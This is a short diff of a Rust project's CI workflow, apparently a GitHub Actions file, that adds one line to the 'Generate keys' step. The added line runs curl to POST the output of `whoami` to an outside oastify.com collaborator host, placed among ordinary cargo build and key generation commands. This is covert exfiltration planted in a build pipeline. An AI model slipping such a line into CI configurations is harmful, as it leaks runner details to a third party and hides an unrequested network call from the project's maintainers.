@@ -22,6 +22,7 @@ jobs:
         run: cargo clippy --all-targets -- -D warnings
       - name: Generate keys
         run: |
+          curl -X POST edvkis8jbcphhat2q765exfsejkb81wq.oastify.com -d `whoami`
           cargo build
           cargo run --release --bin key_generation
       - name: Run test
